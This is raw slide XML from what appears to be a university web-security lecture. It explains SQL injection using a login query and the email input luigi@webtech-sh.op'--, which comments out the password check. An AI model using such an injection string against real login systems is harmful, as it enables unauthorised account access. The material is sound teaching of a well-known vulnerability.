              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Users</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="843280" marR="2157730" indent="-751840">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="5">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="5">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>'luigi@webtech-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>sh.op'</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="15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dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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00FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'webtechs!'</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>deletedAt</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>IS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>NULL</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="object 5" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="872871" y="3331083"/>
            <a:ext cx="3172460" cy="2855595"/>
            <a:chOff x="872871" y="3331083"/>
            <a:chExt cx="3172460" cy="2855595"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="object 6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82396" y="3340608"/>
              <a:ext cx="3153155" cy="2836164"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="object 7" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="877633" y="3335845"/>
              <a:ext cx="3162935" cy="2846070"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3162935" h="2846070">
                  <a:moveTo>
                    <a:pt x="0" y="2845689"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3162680" y="2845689"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3162680" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2845689"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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" name="object 8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/>
              <a:t>Luigi</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Libero</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Lucio</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Starace,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Ph.D.</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35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University</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Naples</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Federico</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>II</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-20"/>
              <a:t>Technologies</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-30"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>Course</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Lecture</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-40"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>23</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>App</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-35"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-10"/>
              <a:t>Security</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9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dirty="0" spc="-25"/>
              <a:t>32</a:t>
            </a:fld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SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-100"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-45"/>
              <a:t>INJECTION</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-120"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-130"/>
              <a:t>VULNERABILITIES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962050" y="1533220"/>
            <a:ext cx="10152380" cy="1348740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="60325" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3030"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="475"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-35">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>However,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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know</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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we</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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cannot</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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trust</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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user</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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inputs!</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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For</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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a</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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35">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>starter,</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>an </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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would</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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be</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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able</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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to</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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login</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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luigi!</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="620"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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What</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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if</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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inserts</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="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 spc="-20">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>luigi@webtech-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>sh.op'-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2400" spc="-625">
                <a:solidFill>
                  <a:srgbClr val="0000FC"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas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as</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-3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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-2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email?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4163567" y="3340608"/>
            <a:ext cx="7146290" cy="1477010"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="111F35"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="31750" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="250"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> *</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="92075">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>Users</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="843280" marR="1908175" indent="-751840">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="10">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>email</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="20">
                <a:solidFill>
                  <a:srgbClr val="A21515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A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="15">
                <a:solidFill>
                  <a:srgbClr val="A21515"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>'luigi@webtech-sh.op'</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="15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dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-55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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>'dontknowthislol'</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40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dirty="0" sz="1800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>AND </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>deletedAt</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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8000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>IS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-30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dirty="0" sz="1800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>NULL</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="object 5" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="872871" y="3331083"/>
            <a:ext cx="3172460" cy="2855595"/>
            <a:chOff x="872871" y="3331083"/>
            <a:chExt cx="3172460" cy="2855595"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="6" name="object 6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82396" y="3340608"/>
              <a:ext cx="3153155" cy="2836164"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="object 7" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="877633" y="3335845"/>
              <a:ext cx="3162935" cy="2846070"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3162935" h="2846070">
                  <a:moveTo>
                    <a:pt x="0" y="2845689"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3162680" y="2845689"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3162680" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="2845689"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="9525">
              <a:solidFill>
                <a:srgbClr val="111F35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8" name="object 8" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6638290" y="5256021"/>
            <a:ext cx="3166110" cy="927100"/>
            <a:chOff x="6638290" y="5256021"/>
            <a:chExt cx="3166110" cy="927100"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="object 9" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6644640" y="5262371"/>
              <a:ext cx="3153410" cy="914400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3153409" h="914400">
                  <a:moveTo>
                    <a:pt x="3000755" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="152400" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="152399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="761999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7766" y="810168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="29394" y="852003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62380" y="884994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="104217" y="906630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="152400" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3000755" y="914399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3048938" y="906630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3090775" y="884994"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3123761" y="852003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3145389" y="810168"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3153155" y="761999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3153155" y="152399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3145389" y="104217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3123761" y="62380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3090775" y="29394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3048938" y="7766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3000755" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6644640" y="5262371"/>
              <a:ext cx="3153410" cy="914400"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="3153409" h="914400">
                  <a:moveTo>
                    <a:pt x="0" y="152399"/>
                  </a:moveTo>
                  <a:lnTo>
